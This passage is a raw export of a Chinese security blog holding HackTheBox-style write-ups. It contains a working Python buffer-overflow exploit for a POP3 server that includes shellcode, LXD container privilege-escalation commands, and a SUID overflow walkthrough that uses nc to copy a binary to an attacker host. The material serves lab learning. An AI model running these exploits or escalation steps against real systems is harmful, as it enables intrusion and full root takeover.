class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>6a<span class="hljs-symbol">\x</span>55<span class="hljs-symbol">\x</span>ce<span class="hljs-symbol">\x</span>7d<span class="hljs-symbol">\x</span>95<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>26<span class="hljs-symbol">\x</span>7e<span class="hljs-symbol">\x</span>28<span class="hljs-symbol">\x</span>33<span class="hljs-symbol">\x</span>fd&quot;<br>&quot;<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>f6<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>e5<span class="hljs-symbol">\x</span>a7<span class="hljs-symbol">\x</span>7d<span class="hljs-symbol">\x</span>60<span class="hljs-symbol">\x</span>c1<span class="hljs-symbol">\x</span>56<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>82<span class="hljs-symbol">\x</span>55<span class="hljs-symbol">\x</span>1e<span class="hljs-symbol">\x</span>73&quot;<br>&quot;<span class="hljs-symbol">\x</span>cc<span class="hljs-symbol">\x</span>79<span class="hljs-symbol">\x</span>a1<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>67<span class="hljs-symbol">\x</span>85<span class="hljs-symbol">\x</span>2a<span class="hljs-symbol">\x</span>57<span class="hljs-symbol">\x</span>a7<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>68<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>63<span class="hljs-symbol">\x</span>4b<span class="hljs-symbol">\x</span>2a&quot;<br>&quot;<span class="hljs-symbol">\x</span>1d<span class="hljs-symbol">\x</span>32<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>9d<span class="hljs-symbol">\x</span>22<span class="hljs-symbol">\x</span>24<span class="hljs-symbol">\x</span>9a<span class="hljs-symbol">\x</span>42<span class="hljs-symbol">\x</span>87<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>37<span class="hljs-symbol">\x</span>96<span class="hljs-symbol">\x</span>ba<span class="hljs-symbol">\x</span>72<span class="hljs-symbol">\x</span>50&quot;<br>&quot;<span class="hljs-symbol">\x</span>5b<span class="hljs-symbol">\x</span>f7<span class="hljs-symbol">\x</span>8c<span class="hljs-symbol">\x</span>a0<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\x</span>80<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>92<span class="hljs-symbol">\x</span>5c<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>97<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>e5<span class="hljs-symbol">\x</span>60&quot;<br>&quot;<span class="hljs-symbol">\x</span>e0<span class="hljs-symbol">\x</span>0f<span class="hljs-symbol">\x</span>51<span class="hljs-symbol">\x</span>fe<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>b0<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>d7<span class="hljs-symbol">\x</span>db<span class="hljs-symbol">\x</span>e4<span class="hljs-symbol">\x</span>f2<span class="hljs-symbol">\x</span>4f<span class="hljs-symbol">\x</span>cd<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>98&quot;<br>&quot;<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>f2<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>0e<span class="hljs-symbol">\x</span>df<span class="hljs-symbol">\x</span>5c<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>ef<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>87<span class="hljs-symbol">\x</span>c5<span class="hljs-symbol">\x</span>92<span class="hljs-symbol">\x</span>24&quot;<br>&quot;<span class="hljs-symbol">\x</span>b7<span class="hljs-symbol">\x</span>e6<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>4d<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>1d<span class="hljs-symbol">\x</span>eb<span class="hljs-symbol">\x</span>b2<span class="hljs-symbol">\x</span>0b<span class="hljs-symbol">\x</span>1c<span class="hljs-symbol">\x</span>83<span class="hljs-symbol">\x</span>5a<span class="hljs-symbol">\x</span>4e<span class="hljs-symbol">\x</span>1e<span class="hljs-symbol">\x</span>52&quot;<br>&quot;<span class="hljs-symbol">\x</span>20<span class="hljs-symbol">\x</span>c7<span class="hljs-symbol">\x</span>f8<span class="hljs-symbol">\x</span>3e<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>8e<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>d7<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>46<span class="hljs-symbol">\x</span>ff<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>4a&quot;<br>&quot;<span class="hljs-symbol">\x</span>48<span class="hljs-symbol">\x</span>8b<span class="hljs-symbol">\x</span>a5<span class="hljs-symbol">\x</span>ab<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>bf<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>8c<span class="hljs-symbol">\x</span>9e<span class="hljs-symbol">\x</span>9d<span class="hljs-symbol">\x</span>57<span class="hljs-symbol">\x</span>92<span class="hljs-symbol">\x</span>34&quot;<br>&quot;<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>34<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>d3<span class="hljs-symbol">\x</span>49<span class="hljs-symbol">\x</span>32<span class="hljs-symbol">\x</span>3a<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>1e<span class="hljs-symbol">\x</span>13<span class="hljs-symbol">\x</span>8c<span class="hljs-symbol">\x</span>85<span class="hljs-symbol">\x</span>ca<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>b7&quot;<br>&quot;<span class="hljs-symbol">\x</span>3f<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>53<span class="hljs-symbol">\x</span>21<span class="hljs-symbol">\x</span>07<span class="hljs-symbol">\x</span>a8<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>92<span class="hljs-symbol">\x</span>86<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>5d<span class="hljs-symbol">\x</span>ae<span class="hljs-symbol">\x</span>ac<span class="hljs-symbol">\x</span>21<span class="hljs-symbol">\x</span>9b&quot;<br>&quot;<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>e9<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>73<span class="hljs-symbol">\x</span>66<span class="hljs-symbol">\x</span>a7<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>35<span class="hljs-symbol">\x</span>d0<span class="hljs-symbol">\x</span>09<span class="hljs-symbol">\x</span>bd<span class="hljs-symbol">\x</span>ef<span class="hljs-symbol">\x</span>8f<span class="hljs-symbol">\x</span>c3<span class="hljs-symbol">\x</span>29&quot;<br>&quot;<span class="hljs-symbol">\x</span>69<span class="hljs-symbol">\x</span>fc<span class="hljs-symbol">\x</span>d3<span class="hljs-symbol">\x</span>2f<span class="hljs-symbol">\x</span>76<span class="hljs-symbol">\x</span>29<span class="hljs-symbol">\x</span>a2<span class="hljs-symbol">\x</span>cf<span class="hljs-symbol">\x</span>c7<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>f3<span class="hljs-symbol">\x</span>f0<span class="hljs-symbol">\x</span>e8<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>f4&quot;<br>&quot;<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>14<span class="hljs-symbol">\x</span>f1<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>40<span class="hljs-symbol">\x</span>9d<span class="hljs-symbol">\x</span>01<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>c8<span class="hljs-symbol">\x</span>b4<span class="hljs-symbol">\x</span>89<span class="hljs-symbol">\x</span>1f<span class="hljs-symbol">\x</span>99<span class="hljs-symbol">\x</span>84<span class="hljs-symbol">\x</span>d7&quot;<br>&quot;<span class="hljs-symbol">\x</span>9f<span class="hljs-symbol">\x</span>74<span class="hljs-symbol">\x</span>ca<span class="hljs-symbol">\x</span>e1<span class="hljs-symbol">\x</span>23<span class="hljs-symbol">\x</span>7c<span class="hljs-symbol">\x</span>b3<span class="hljs-symbol">\x</span>15<span class="hljs-symbol">\x</span>3b<span class="hljs-symbol">\x</span>f5<span class="hljs-symbol">\x</span>b6<span class="hljs-symbol">\x</span>52<span class="hljs-symbol">\x</span>fb<span class="hljs-symbol">\x</span>e6<span class="hljs-symbol">\x</span>ca&quot;<br>&quot;<span class="hljs-symbol">\x</span>cb<span class="hljs-symbol">\x</span>6e<span class="hljs-symbol">\x</span>08<span class="hljs-symbol">\x</span>78<span class="hljs-symbol">\x</span>eb<span class="hljs-symbol">\x</span>ba&quot;)<br><br>#string= &quot;A&quot;* 2606+ &quot;<span class="hljs-symbol">\x</span>a3<span class="hljs-symbol">\x</span>0e<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>5f&quot; + &quot;C&quot;*(3500-2606-4)<br>string=&quot;A&quot;*2606 + &quot;<span class="hljs-symbol">\x</span>a3<span class="hljs-symbol">\x</span>0e<span class="hljs-symbol">\x</span>4c<span class="hljs-symbol">\x</span>5f&quot; + &quot;<span class="hljs-symbol">\x</span>90&quot; * 8 + shellcode<br>try:<br>print &quot;<span class="hljs-symbol">\n</span>Sending evil buffer...&quot;<br>s.connect((&#x27;192.168.1.103&#x27;,110)) # connect to IP, POP3 port<br>data = s.recv(1024) # receive banner<br>print data # print banner<br>s.send(&#x27;USER test&#x27; +&#x27;<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;) # send username &quot;test&quot;<br>data = s.recv(1024) # receive reply<br>print data # print reply<br>#s.send(&#x27;PASS test<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;) # send password &quot;test&quot;<br>s.send(&#x27;PASS &#x27; + string + &#x27;<span class="hljs-symbol">\r</span><span class="hljs-symbol">\n</span>&#x27;)<br>data = s.recv(1024)<br>print data # print reply<br>s.close() # close socket<br>print &quot;<span class="hljs-symbol">\n</span>Done!&quot;<br>except:<br>print &quot;Could not connect to POP3!&quot;<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/12.PNG" alt="12"><br>最终得到了一个system权限的shell</p><h2 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h2><p>在上一小节的exp中，栈中数据是这样运行的</p><p><code>string=&quot;A&quot;*2606 + &quot;\xa3\x0e\x4c\x5f&quot; + &quot;\x90&quot; * 8 + shellcode</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-15-03/13.png" alt="13"></p><p>联系上一篇<a href="https://whale3070.github.io/training/2020/01/06/06-x/">Sneaky（suid+缓冲区溢出提权）</a>，我们可以知道，最重要的是在跳转的时候，<strong>跳转的地址是shellcode之前</strong></p><p>这样程序就会正常向后执行，来执行插入的shellcode，从而执行了我们想要的命令。</p><p>在本篇中，ESP的具体地址我们是不知道的，因为每一次程序运行，ESP的地址都有可能改变。取而代之的是使用<code>JMP ESP</code>命令，让它帮助我们跳转到栈顶。如图所示，栈底就是一开始接受数据的地方，栈长度是2606，栈顶就是图中红色部分。</p><p>使用JMP ESP跳转到红色的部分，然后正常往后执行，就执行了shellcode。</p>]]></content>
    
    
    <categories>
      
      <category>buffer overflow</category>
      
    </categories>
    
    
    <tags>
      
      <tag>buffer overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Calamity（lxd之linux容器错误权限的提权）</title>
    <link href="/2020/01/09/09-x/"/>
    <url>/2020/01/09/09-x/</url>
    
    <content type="html"><![CDATA[<p><a href="https://whale3070.github.io/training/2019/03/21/x/">上一篇：Calamity（web rce）</a></p><h2 id="Calamity（lxd之linux容器错误权限的提权）"><a href="#Calamity（lxd之linux容器错误权限的提权）" class="headerlink" title="Calamity（lxd之linux容器错误权限的提权）"></a>Calamity（lxd之linux容器错误权限的提权）</h2><p>参考资料：</p><ul><li><a href="https://reboare.github.io/hackthebox/calamity.html">https://reboare.github.io/hackthebox/calamity.html</a></li><li><a href="https://www.youtube.com/watch?v=EloOaaGg3nA">https://www.youtube.com/watch?v=EloOaaGg3nA</a></li></ul><figure class="highlight dns"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dns">ssh xalvas@<span class="hljs-number">10.10.10.27</span><br><span class="hljs-number">18547936</span>..*<br></code></pre></div></td></tr></table></figure><p>得到一个用户权限的shell</p><h2 id="lxd提权"><a href="#lxd提权" class="headerlink" title="lxd提权"></a>lxd提权</h2><p><a href="https://reboare.github.io/lxd/lxd-escape.html">https://reboare.github.io/lxd/lxd-escape.html</a></p><hr><p>【kali运行】</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">git</span> clone https://github.com/saghul/lxd-alpine-builder<br><span class="hljs-attribute">cd</span> lxd-alpine-builder;./build-alpine -a i<span class="hljs-number">686</span><br><span class="hljs-comment">#该步骤下载一个lxd容器模板</span><br><br><span class="hljs-attribute">scp</span> alpine-v<span class="hljs-number">3</span>.<span class="hljs-number">11</span>-i<span class="hljs-number">686</span>-<span class="hljs-number">20200109</span>_<span class="hljs-number">0853</span>.tar.gz xalvas@<span class="hljs-number">10.10.10.27</span>:/tmp/<br><span class="hljs-attribute">18547936</span>..*<br><span class="hljs-comment">#将容器模板复制到目标机</span><br></code></pre></div></td></tr></table></figure><p>【目标shell运行】</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">lxc image import alpine-v3.11-i686-20200109_0853.tar.gz <span class="hljs-attribute">--alias</span>=alpine<br><br>lxc init alpine alpsarecold -c security.<span class="hljs-attribute">privileged</span>=<span class="hljs-literal">true</span><br><br>lxc<span class="hljs-built_in"> config </span>device <span class="hljs-builtin-name">add</span> alpsarecold somedisk disk <span class="hljs-attribute">source</span>=/ <span class="hljs-attribute">path</span>=/mnt/root <span class="hljs-attribute">recursive</span>=<span class="hljs-literal">true</span> <br><br>lxc exec alpsarecold <span class="hljs-attribute">--mode</span>=interactive /bin/sh<br>运行后，即获得<br><br></code></pre></div></td></tr></table></figure><h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><p>lxd是ubuntu容器管理软件，可以看作和docker一样。</p><p>lxd组和docker组一样，有不安全的地方。</p><p>本地容器的普通用户在任何情况下都不应该被允许访问lxd，因为这样十分容易被入侵。</p><p>首先，我将检查您的用户是否是该组的成员，因为如果您安装了该用户并且是sudoer，则很可能是您。 安装后，lxd会自动将每个用户添加到lxd组中。考虑到sudoer自动具有root访问权限，这可以认为是可以的，但它忘记了sudo具有适当的审核功能，并且确实需要密码来执行root所需的任何操作。 实际上，仅安装lxd等效于在sudoers文件中添加以下内容。</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">admin</span>    <span class="hljs-keyword">ALL</span>=NOPASSWD: <span class="hljs-keyword">ALL</span><br></code></pre></div></td></tr></table></figure><p>如果某人获得了对管理员帐户的访问权限，那么他们将立即获得完全的root访问权限，而无需输入密码。<br>考虑一个ssh私钥逃逸到该用户下运行的野外服务或过时的服务，突然之间，一个仍然没有破解admin帐户密码的攻击者就具有完全的root访问权，这都是因为您安装了lxd。</p><p>我并不是在反对lxd组的存在，只是在不通知用户的情况下增加了攻击面。 发现此问题的原因在于用户没有意识到该组赋予其帐户的权力，<br>并且在删除了sudo特权的同时，没有进行lxd访问。</p><p>lcd运行用户使用全部权限，无需使用sudo<br>而lxd必需要root权限来执行程序。所以可以通过lcd来提权。</p>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sneaky（suid+缓冲区溢出提权）</title>
    <link href="/2020/01/06/06-x/"/>
    <url>/2020/01/06/06-x/</url>
    
    <content type="html"><![CDATA[<p>上一篇：<a href="https://whale3070.github.io/training/2019/10/26/07-x/">Sneaky(snmp默认口令泄露敏感信息)</a></p><p>参考资料：</p><ul><li><a href="https://whale3070.github.io/buffer%20overflow/2019/12/13/08-x/">缓冲区溢出案例（一）</a></li><li><a href="https://www.youtube.com/watch?v=1UGxjqTnuyo">ippsec youtube video</a></li></ul><blockquote><p>名词解释<br>函数返回地址：保存当前函数调用前的信息，一边函数返回时能够回复到函数被调用前的代码区中继续执行指令。<br>EIP: 指令寄存器，指向下一条等待执行的指令地址。</p></blockquote><h2 id="找到suid权限的程序"><a href="#找到suid权限的程序" class="headerlink" title="找到suid权限的程序"></a>找到suid权限的程序</h2><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle"><span class="hljs-keyword">find</span> <span class="hljs-regexp">/ -perm -4000 2&gt;/</span>dev/<span class="hljs-keyword">null</span> &gt; examSUID.txt<br></code></pre></div></td></tr></table></figure><h2 id="让该程序报错，证明可能有bof漏洞"><a href="#让该程序报错，证明可能有bof漏洞" class="headerlink" title="让该程序报错，证明可能有bof漏洞"></a>让该程序报错，证明可能有bof漏洞</h2><p><code>python -c &quot;print &#39;A&#39;*500&quot;</code></p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06-06/1.PNG" alt="1"></p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/bin/</span>chal $(python -c <span class="hljs-string">&quot;print &#x27;A&#x27;*500&quot;</span>) <br>Segmentation fault (core dumped)<br></code></pre></div></td></tr></table></figure><h2 id="nc下载程序到本地进行分析"><a href="#nc下载程序到本地进行分析" class="headerlink" title="nc下载程序到本地进行分析"></a>nc下载程序到本地进行分析</h2><p>【kali运行】<code>nc -lnvp 8000 &gt; chal</code><br>【目标shell运行】<code>nc 10.10.14.8 8000 &lt; /usr/local/bin/chal</code></p><h2 id="定位缓冲区长度为362字节"><a href="#定位缓冲区长度为362字节" class="headerlink" title="定位缓冲区长度为362字节"></a>定位缓冲区长度为362字节</h2><p>** 生成500字节字符串**</p><figure class="highlight smali"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs smali">locate pattern_create<br>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 500<br><br>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq<br></code></pre></div></td></tr></table></figure><p><strong>gdb调试该程序</strong></p><p><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/gdb.html">gdb用法</a></p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">gdb</span> -q chal<br><span class="hljs-attribute">run</span> Aa<span class="hljs-number">0</span>Aa<span class="hljs-number">1</span>Aa<span class="hljs-number">2</span>Aa<span class="hljs-number">3</span>Aa<span class="hljs-number">4</span>Aa<span class="hljs-number">5</span>Aa<span class="hljs-number">6</span>Aa<span class="hljs-number">7</span>Aa<span class="hljs-number">8</span>Aa<span class="hljs-number">9</span>Ab<span class="hljs-number">0</span>Ab<span class="hljs-number">1</span>Ab<span class="hljs-number">2</span>Ab<span class="hljs-number">3</span>Ab<span class="hljs-number">4</span>Ab<span class="hljs-number">5</span>Ab<span class="hljs-number">6</span>Ab<span class="hljs-number">7</span>Ab<span class="hljs-number">8</span>Ab<span class="hljs-number">9</span>Ac<span class="hljs-number">0</span>Ac<span class="hljs-number">1</span>Ac<span class="hljs-number">2</span>Ac<span class="hljs-number">3</span>Ac<span class="hljs-number">4</span>Ac<span class="hljs-number">5</span>Ac<span class="hljs-number">6</span>Ac<span class="hljs-number">7</span>Ac<span class="hljs-number">8</span>Ac<span class="hljs-number">9</span>Ad<span class="hljs-number">0</span>Ad<span class="hljs-number">1</span>Ad<span class="hljs-number">2</span>Ad<span class="hljs-number">3</span>Ad<span class="hljs-number">4</span>Ad<span class="hljs-number">5</span>Ad<span class="hljs-number">6</span>Ad<span class="hljs-number">7</span>Ad<span class="hljs-number">8</span>Ad<span class="hljs-number">9</span>Ae<span class="hljs-number">0</span>Ae<span class="hljs-number">1</span>Ae<span class="hljs-number">2</span>Ae<span class="hljs-number">3</span>Ae<span class="hljs-number">4</span>Ae<span class="hljs-number">5</span>Ae<span class="hljs-number">6</span>Ae<span class="hljs-number">7</span>Ae<span class="hljs-number">8</span>Ae<span class="hljs-number">9</span>Af<span class="hljs-number">0</span>Af<span class="hljs-number">1</span>Af<span class="hljs-number">2</span>Af<span class="hljs-number">3</span>Af<span class="hljs-number">4</span>Af<span class="hljs-number">5</span>Af<span class="hljs-number">6</span>Af<span class="hljs-number">7</span>Af<span class="hljs-number">8</span>Af<span class="hljs-number">9</span>Ag<span class="hljs-number">0</span>Ag<span class="hljs-number">1</span>Ag<span class="hljs-number">2</span>Ag<span class="hljs-number">3</span>Ag<span class="hljs-number">4</span>Ag<span class="hljs-number">5</span>Ag<span class="hljs-number">6</span>Ag<span class="hljs-number">7</span>Ag<span class="hljs-number">8</span>Ag<span class="hljs-number">9</span>Ah<span class="hljs-number">0</span>Ah<span class="hljs-number">1</span>Ah<span class="hljs-number">2</span>Ah<span class="hljs-number">3</span>Ah<span class="hljs-number">4</span>Ah<span class="hljs-number">5</span>Ah<span class="hljs-number">6</span>Ah<span class="hljs-number">7</span>Ah<span class="hljs-number">8</span>Ah<span class="hljs-number">9</span>Ai<span class="hljs-number">0</span>Ai<span class="hljs-number">1</span>Ai<span class="hljs-number">2</span>Ai<span class="hljs-number">3</span>Ai<span class="hljs-number">4</span>Ai<span class="hljs-number">5</span>Ai<span class="hljs-number">6</span>Ai<span class="hljs-number">7</span>Ai<span class="hljs-number">8</span>Ai<span class="hljs-number">9</span>Aj<span class="hljs-number">0</span>Aj<span class="hljs-number">1</span>Aj<span class="hljs-number">2</span>Aj<span class="hljs-number">3</span>Aj<span class="hljs-number">4</span>Aj<span class="hljs-number">5</span>Aj<span class="hljs-number">6</span>Aj<span class="hljs-number">7</span>Aj<span class="hljs-number">8</span>Aj<span class="hljs-number">9</span>Ak<span class="hljs-number">0</span>Ak<span class="hljs-number">1</span>Ak<span class="hljs-number">2</span>Ak<span class="hljs-number">3</span>Ak<span class="hljs-number">4</span>Ak<span class="hljs-number">5</span>Ak<span class="hljs-number">6</span>Ak<span class="hljs-number">7</span>Ak<span class="hljs-number">8</span>Ak<span class="hljs-number">9</span>Al<span class="hljs-number">0</span>Al<span class="hljs-number">1</span>Al<span class="hljs-number">2</span>Al<span class="hljs-number">3</span>Al<span class="hljs-number">4</span>Al<span class="hljs-number">5</span>Al<span class="hljs-number">6</span>Al<span class="hljs-number">7</span>Al<span class="hljs-number">8</span>Al<span class="hljs-number">9</span>Am<span class="hljs-number">0</span>Am<span class="hljs-number">1</span>Am<span class="hljs-number">2</span>Am<span class="hljs-number">3</span>Am<span class="hljs-number">4</span>Am<span class="hljs-number">5</span>Am<span class="hljs-number">6</span>Am<span class="hljs-number">7</span>Am<span class="hljs-number">8</span>Am<span class="hljs-number">9</span>An<span class="hljs-number">0</span>An<span class="hljs-number">1</span>An<span class="hljs-number">2</span>An<span class="hljs-number">3</span>An<span class="hljs-number">4</span>An<span class="hljs-number">5</span>An<span class="hljs-number">6</span>An<span class="hljs-number">7</span>An<span class="hljs-number">8</span>An<span class="hljs-number">9</span>Ao<span class="hljs-number">0</span>Ao<span class="hljs-number">1</span>Ao<span class="hljs-number">2</span>Ao<span class="hljs-number">3</span>Ao<span class="hljs-number">4</span>Ao<span class="hljs-number">5</span>Ao<span class="hljs-number">6</span>Ao<span class="hljs-number">7</span>Ao<span class="hljs-number">8</span>Ao<span class="hljs-number">9</span>Ap<span class="hljs-number">0</span>Ap<span class="hljs-number">1</span>Ap<span class="hljs-number">2</span>Ap<span class="hljs-number">3</span>Ap<span class="hljs-number">4</span>Ap<span class="hljs-number">5</span>Ap<span class="hljs-number">6</span>Ap<span class="hljs-number">7</span>Ap<span class="hljs-number">8</span>Ap<span class="hljs-number">9</span>Aq<span class="hljs-number">0</span>Aq<span class="hljs-number">1</span>Aq<span class="hljs-number">2</span>Aq<span class="hljs-number">3</span>Aq<span class="hljs-number">4</span>Aq<span class="hljs-number">5</span>Aq<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06-06/2.PNG" alt="2"></p><p>得到一个地址0x316d4130</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">locate pattern_offset.rb<br><span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/metasploit-framework/</span>tools<span class="hljs-regexp">/exploit/</span>pattern_offset.rb -l <span class="hljs-number">500</span> -q <span class="hljs-number">316</span>d4130<br></code></pre></div></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/01-06-06/3.PNG" alt="3"></p><p>offset 362， 现在我们知道了第362就是要覆盖的返回地址。</p><h2 id="搜索shellcode"><a href="#搜索shellcode" class="headerlink" title="搜索shellcode"></a>搜索shellcode</h2><p>【目标shell运行】uname -a</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">Linux</span> Sneaky <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">75</span>-generic #<span class="hljs-number">96</span>~<span class="hljs-number">14</span>.<span class="hljs-number">04</span>.<span class="hljs-number">1</span>-Ubuntu SMP Thu Apr <span class="hljs-number">20</span> <span class="hljs-number">11</span>:<span class="hljs-number">06</span>:<span class="hljs-number">56</span> UTC <span class="hljs-number">2017</span> i<span class="hljs-number">686</span> athlon i<span class="hljs-number">686</span> GNU/Linux<br></code></pre></div></td></tr></table></figure><p>搜索i686，可得知目标机器是86位的机器。</p><p>google搜索关键词”  packetstorm /bin/sh shellcode  “</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">char shellcode[] = <br>&quot;<span class="hljs-symbol">\x</span>31<span class="hljs-symbol">\x</span>c0<span class="hljs-symbol">\x</span>50<span class="hljs-symbol">\x</span>68<span 